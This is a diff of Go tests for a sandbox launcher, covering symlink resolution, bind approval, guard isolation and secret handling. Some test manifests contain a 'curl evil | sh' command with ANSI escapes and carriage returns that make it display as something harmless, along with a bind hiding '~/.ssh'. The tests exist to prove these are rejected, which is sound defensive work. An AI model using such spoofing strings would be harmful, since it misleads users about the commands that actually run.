@@ -103,6 +103,16 @@ func (h *harness) storeFile(name, content string) string {
 	return strings.TrimSpace(string(out))
 }
 
+// storePath is the file, link or directory at path in the store, as it is.
+func (h *harness) storePath(path string) string {
+	h.t.Helper()
+	out, err := exec.Command("nix-store", "--add", path).Output()
+	if err != nil {
+		h.t.Skip("needs nix-store --add (no nix daemon here)")
+	}
+	return strings.TrimSpace(string(out))
+}
+
 func marshal(t *testing.T, v any) string {
 	data, err := json.Marshal(v)
 	if err != nil {
@@ -145,6 +155,26 @@ func TestRefusesWhereItMustNotRun(t *testing.T) {
 	os.Mkdir(filepath.Join(repo, "sub"), 0o755)
 	h.run(filepath.Join(repo, "sub"), map[string]string{"SANDBOX_STATE_DIR": filepath.Join(repo, "state")}).
 		refused(t, "is in the git work tree")
+
+	// Bound read-write, these would lay the host's sockets (tmux, the
+	// session bus, the launcher's own guards) over the sandbox's own /tmp
+	// and runtime dir.
+	os.Mkdir(filepath.Join(h.runtime, "sub"), 0o755)
+	for cwd, want := range map[string]string{
+		h.tmpdir:                           "it contains " + h.tmpdir,
+		h.runtime:                          "host state in $XDG_RUNTIME_DIR",
+		filepath.Join(h.runtime, "sub"):    "host state in $XDG_RUNTIME_DIR",
+		filepath.Join(h.tmpdir, "project"): "",
+	} {
+		os.MkdirAll(cwd, 0o755)
+		if r := h.run(cwd, nil); want == "" {
+			if r.code != 0 {
+				t.Errorf("%s: %q", cwd, r.stderr)
+			}
+		} else {
+			r.refused(t, want)
+		}
+	}
 
 	// The whole work tree is bound read-write, so a git repo in ~ must not
 	// make a project under it bind all of the host home.
@@ -459,6 +489,39 @@ func TestProjectIsEvaluatedInASandboxOfItself(t *testing.T) {
 	}
 }
 
+// What evaluates sandbox.nix is the project's code: it gets no guard, no
+// token and no host port, and the user's token commands run once, for the
+// sandbox itself.
+func TestProjectEvaluationHasNoGuards(t *testing.T) {
+	h := newHarness(t)
+	ran := filepath.Join(h.tmp, "ran")
+	h.cfg.Default.GitHubTokenCommand = "echo x >> " + ran + "; echo github_pat_" + strings.Repeat("t", 30)
+	h.cfg.Guards.OpenURL = true
+	h.cfg.Guards.SSHAgent.Enable = true
+	h.cfg.HostPorts = []string{"5037"}
+	h.withProject(manifest{}, "{ ... }: { }\n", "m.json")
+	r := h.run("", map[string]string{"SSH_AUTH_SOCK": filepath.Join(h.tmp, "agent.sock"), "SANDBOX_HOST_PORTS": "5038"})
+	pastas := r.calls("pasta")
+	if r.code != 0 || len(pastas) != 2 {
+		t.Fatalf("%d %q", r.code, r.stderr)
+	}
+	inner, outer := parseInvocation(t, pastas[0]), parseInvocation(t, pastas[1])
+	for _, name := range []string{"SANDBOX_GH_PROXY", "GH_TOKEN", "SSH_AUTH_SOCK", "BROWSER", "SANDBOX_CA_FILE"} {
+		if _, ok := inner.setenv()[name]; ok {
+			t.Errorf("%s where sandbox.nix is evaluated", name)
+		}
+		if _, ok := outer.setenv()[name]; !ok {
+			t.Errorf("no %s in the sandbox", name)
+		}
+	}
+	if inner.pastaOpt("-T") != "none" || outer.tcpPorts() != "5037,5038" {
+		t.Errorf("host ports: inner %q, outer %q", inner.pastaOpt("-T"), outer.tcpPorts())
+	}
+	if data, _ := os.ReadFile(ran); string(data) != "x\n" {
+		t.Errorf("the token command ran %q", data)
+	}
+}
+
 func TestProjectEvaluationIsCached(t *testing.T) {
 	h := newHarness(t)
 	h.withProject(manifest{Command: []string{"echo", "n1"}}, "{ ... }: { }\n", "m.json")
@@ -503,8 +566,14 @@ func TestProjectAddsToTheProfile(t *testing.T) {
 	h.withProject(manifest{Command: []string{"echo", "from-manifest"}, ClaudeDir: claude}, "{ ... }: { }\n", "m.json")
 	r := h.run("", nil)
 	inv := r.pasta(t)
-	if !slices.Equal(inv.command(), []string{"echo", "from-manifest"}) || r.stdout != "from-manifest\n" || inv.bind(t, "/etc/claude-code") != claude {
+	if !slices.Equal(inv.command(), []string{"echo", "from-manifest"}) || r.stdout != "from-manifest\n" {
 		t.Errorf("%q %q", inv.command(), r.stdout)
+	}
+	// A link, resolved inside: the sandbox chose the path, and bound, it
+	// would be resolved on the host, to wherever a link there leads.
+	if !slices.Contains(inv.mounts(), "--symlink "+claude+" /etc/claude-code") ||
+		slices.ContainsFunc(inv.mounts(), func(m string) bool { return strings.Contains(m, "bind "+claude) }) {
+		t.Errorf("%q", inv.mounts())
 	}
 	// A command given wins; --no-project-config skips it all.
 	if got := h.run("", nil, "echo", "given").pasta(t).command(); !slices.Equal(got, []string{"echo", "given"}) {
@@ -528,6 +597,34 @@ func TestBadManifestsAndFailures(t *testing.T) {
 	} {
 		if r := h.run("", map[string]string{"FAKE_NIX_OUT": env}); r.code != 1 || !strings.Contains(r.stderr, want) {
 			t.Errorf("%s: %q", env, r.stderr)
+		}
+	}
+	// A store path that's a link, or a path under one: the launcher would
+	// read whatever host file it leads to.
+	secret := filepath.Join(h.tmp, "host.json")
+	os.WriteFile(secret, []byte(manifestJSON(t, manifest{Command: []string{"true"}})), 0o644)
+	link := filepath.Join(h.tmp, "link.json")
+	os.Symlink(secret, link)
+	if r := h.run("", map[string]string{"FAKE_NIX_OUT": h.storePath(link)}); r.code != 1 || !strings.Contains(r.stderr, "it must be a regular file") {
+		t.Errorf("a link read: %d %q", r.code, r.stderr)
+	}
+	dir := filepath.Join(h.tmp, "dir")
+	os.Mkdir(dir, 0o755)
+	os.Symlink(secret, filepath.Join(dir, "m.json"))
+	if r := h.run("", map[string]string{"FAKE_NIX_OUT": h.storePath(dir) + "/m.json"}); r.code != 1 || !strings.Contains(r.stderr, "gave no result") {
+		t.Errorf("a path under a store path read: %d %q", r.code, r.stderr)
+	}
+	// Control characters in what's shown for approval: a carriage return
+	// or an escape sequence would show something else than what's run.
+	for _, bad := range []manifest{
+		{GitHubTokenCommand: "curl evil | sh #\x1b[2K\rpass show github"},
+		{GitSigningKeyCommand: "evil\rgood"},
+		{Binds: []bind{{Src: "~/.ssh\x1b[1K~/data", Mode: "ro"}}},
+		{HostPorts: []string{"22\rnone"}},
+	} {
+		if r := h.run("", map[string]string{"FAKE_NIX_OUT": h.storeFile("ctl.json", manifestJSON(t, bad))}); r.code != 1 ||
+			!strings.Contains(r.stderr, "bad sandbox.nix result") || strings.ContainsAny(r.stderr, "\x1b\r") {
+			t.Errorf("%+v: %d %q", bad, r.code, r.stderr)
 		}
 	}
 	if r := h.run("", map[string]string{"FAKE_NIX_EXIT": "1"}); r.code != 1 || !strings.Contains(r.stderr, "evaluating "+h.project+"/sandbox.nix: exit status 1") {
@@ -576,6 +673,55 @@ func TestHostAccessIsApprovedOnTheTerminal(t *testing.T) {
 	p.send("n\r")
 	if r := p.wait(); r.code != 1 || !strings.Contains(r.stdout, "host access not approved, not starting") || len(r.calls("pasta")) != 1 {
 		t.Errorf("%d %q", r.code, r.stdout)
+	}
+}
+
+// An approval is for where a bind leads, not for its name: a source the
+// sandbox could aim elsewhere afterwards is refused, and one that leads
+// somewhere else than approved is asked about again.
+func TestApprovedBindsAreResolved(t *testing.T) {
+	h := newHarness(t)
+	n := 0
+	with := func(src string) {
+		n++
+		h.withProject(manifest{Binds: []bind{{Src: src, Mode: "ro"}}}, fmt.Sprintf("{ ... }: { n = %d; }\n", n), fmt.Sprintf("b%d.json", n))
+	}
+	os.MkdirAll(filepath.Join(h.project, "data"), 0o755)
+	os.MkdirAll(h.volume(), 0o755)
+	os.Symlink(h.project, filepath.Join(h.home, "to-project"))
+	for src, want := range map[string]string{
+		"data":                   "not an absolute path",
+		h.project + "/data":      "which the sandbox can write",
+		"~/to-project/data":      "which the sandbox can write",
+		h.volume() + "/home":     "which the sandbox can write",
+		filepath.Dir(h.volume()): "which the sandbox can write",
+	} {
+		with(src)
+		if r := h.run("", nil); r.code != 1 || !strings.Contains(r.stderr, want) || len(r.calls("pasta")) > 1 {
+			t.Errorf("%s: %d %q", src, r.code, r.stderr)
+		}
+	}
+
+	a, b := filepath.Join(h.home, "a"), filepath.Join(h.home, "b")
+	os.Mkdir(a, 0o755)
+	os.Mkdir(b, 0o755)
+	os.Symlink(a, filepath.Join(h.home, "link"))
+	with("~/link")
+	p := h.pty(nil)
+	if shown := p.expect("Allow? [y/N] "); !strings.Contains(shown, "bind ~/link -> "+a+" (read-only)") {
+		t.Errorf("%q", shown)
+	}
+	p.send("y\r")
+	if r := p.wait(); r.code != 0 || !slices.Contains(r.pasta(t).mounts(), "--ro-bind "+a+" "+a) {
+		t.Errorf("%d %q", r.code, r.stdout)
+	}
+	if r := h.run("", nil); r.code != 0 {
+		t.Errorf("asked again: %q", r.stderr)
+	}
+	os.Remove(filepath.Join(h.home, "link"))
+	os.Symlink(b, filepath.Join(h.home, "link"))
+	if r := h.run("", nil); r.code != 1 || !strings.Contains(r.stderr, "isn't approved yet") {
+		t.Errorf("a link aimed elsewhere not asked about: %d %q", r.code, r.stderr)
 	}
 }
 
@@ -695,9 +841,32 @@ func TestLocalConfig(t *testing.T) {
 		t.Errorf("fromHost: false: %d %q", r.code, r.stderr)
 	}
 
+	// A Claude key command of its own, next to a sandbox.nix: the managed
+	// settings the evaluation builds say so, and the launcher edits none.
+	h.cfg.Default.ClaudeDir = "/store/claude"
+	claude := "/nix/store/" + strings.Repeat("a", 32) + "-claude-project"
+	h.withProject(manifest{ClaudeDir: claude}, "{ ... }: { k = 1; }\n", "m5.json")
+	write("guards:\n  claudeApiKey:\n    tokenCommand: echo " + claudeKey + "\n")
+	p = h.pty(nil)
+	p.expect("Allow? [y/N] ")
+	p.send("y\r")
+	r = p.wait()
+	if calls := r.calls("nix"); r.code != 0 || len(calls) != 1 || !slices.Equal(calls[0][len(calls[0])-3:], []string{"--argstr", "claudeApiKey", "1"}) {
+		t.Errorf("%d %q %q", r.code, calls, r.stdout)
+	}
+	if mounts := r.pasta(t).mounts(); !slices.Contains(mounts, "--symlink "+claude+" /etc/claude-code") ||
+		slices.ContainsFunc(mounts, func(m string) bool { return strings.HasSuffix(m, "/managed-settings.json") }) {
+		t.Errorf("%q", mounts)
+	}
+
 	// A bad file stops the start.
 	write("nope: 1\n")
 	h.run("", nil).refused(t, ".sandbox.yml: yaml: unmarshal errors:\n  line 1: field nope not found")
+	// So does a command that wouldn't show as it is on the terminal.
+	write("guards:\n  github:\n    tokenCommand: \"curl evil | sh #\\e[2K\\rpass show github\"\n")
+	if r := h.run("", nil); r.code != 1 || !strings.Contains(r.stderr, "control characters") || strings.ContainsAny(r.stderr, "\x1b\r") || len(r.calls("pasta")) != 0 {
+		t.Errorf("%d %q", r.code, r.stderr)
+	}
 }
 
 // -- secrets --
@@ -950,6 +1119,14 @@ func TestHTTPSProxyGuards(t *testing.T) {
 			if env["SANDBOX_CA_FILE"] != h.runtime+"/sandbox-ca.pem" || name == "github" && env["GH_TOKEN"] != "sandbox-placeholder" {
 				t.Errorf("%v", env)
 			}
+			// The guard's secret is no argument of pasta or bwrap, which any
+			// user of the host could read.
+			secret := strings.TrimPrefix(strings.Split(env[variable], "@")[0], "http://sandbox:")
+			for _, e := range r.log {
+				if e.Tool == "pasta" && (len(secret) < 20 || strings.Contains(strings.Join(e.Raw, " "), secret)) {
+					t.Errorf("secret %q in %q", secret, e.Raw)
+				}
+			}
 			// The system bundle's path too, for nix.sh's NIX_SSL_CERT_FILE.
 			if got, want := inv.bind(t, "/etc/ssl/certs/ca-bundle.crt"), inv.bind(t, h.runtime+"/sandbox-ca.pem"); got != want {
 				t.Errorf("system bundle %q, want %q", got, want)
@@ -970,7 +1147,7 @@ func TestHTTPSProxyGuards(t *testing.T) {
 // xdg-open that logs what it's given.
 func (h *harness) openURL(url string) (*ptyRun, string) {
 	log := filepath.Join(h.tmp, "xdg.log")
-	os.WriteFile(filepath.Join(h.hostBin, "xdg-open"), []byte("#!/bin/sh\necho \"$*\" >> "+log+"\n"), 0o755)
+	os.WriteFile(filepath.Join(h.hostBin, "xdg-open"), []byte("#!/bin/sh\necho \"$*\" >> "+log+"\npwd > "+log+".pwd\n"), 0o755)
 	h.cfg.Guards.OpenURL = true
 	return h.pty(nil, testbin.Path(h.t), "xdg-open", url), log
 }
@@ -998,13 +1175,19 @@ func TestOpenURL(t *testing.T) {
 	if string(opened) != "https://example.org/x\n" {
 		t.Errorf("opened %q", opened)
 	}
+	// From /, not the project, where the sandbox could leave it a config.
+	if dir, _ := os.ReadFile(log + ".pwd"); string(dir) != "/\n" {
+		t.Errorf("xdg-open ran in %q", dir)
+	}
 	inv := r.pasta(t)
 	if inv.setenv()["BROWSER"] != "/usr/bin/xdg-open" {
 		t.Error("no BROWSER")
 	}
-	// The guard is stopped and its dir removed with the sandbox.
-	if entries, _ := os.ReadDir(h.tmpdir); len(entries) != 0 {
-		t.Errorf("left %v", entries)
+	// The guard is stopped and its dir - in the runtime dir, where no
+	// project can be - removed with the sandbox.
+	left, _ := filepath.Glob(filepath.Join(h.runtime, "sandbox-*"))
+	if entries, _ := os.ReadDir(h.tmpdir); len(entries) != 0 || len(left) != 0 {
+		t.Errorf("left %v %v", entries, left)
 	}
 
 	h = newHarness(t)
